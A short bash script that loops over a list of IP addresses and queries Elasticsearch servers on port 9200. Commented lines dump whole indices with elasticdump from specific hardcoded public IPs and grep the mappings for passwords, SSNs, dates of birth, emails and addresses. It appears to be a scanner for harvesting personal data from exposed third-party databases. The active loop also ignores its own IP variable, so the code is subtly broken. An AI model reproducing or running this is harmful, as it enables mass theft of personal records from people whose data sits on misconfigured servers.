#!/bin/bash

while read i; do
    echo $i
    curl -X GET "50.17.100.245:9200/_cat/indices?v"
done <ips_part1.txt


#for INDEX in http://107.20.1.248:9200$indices;
#elasticdump --input=http://$i:9200/$EI --output=files/$i/$i-$EI.json --limit=10000;done
#elasticdump --input=http://52.9.13.157:9200/$EI --output=52.9.13.157-orders-2018.03.01.json --limit=10000;done
#curl -X GET "http://107.20.1.248:9200/indicies?h=i&s=docs.count:desc | head -n1"
#curl -X GET "http://107.20.1.248:9200/_all/_mapping" | grep 'password\|dob\|username\|ssn\|email\|address\|'

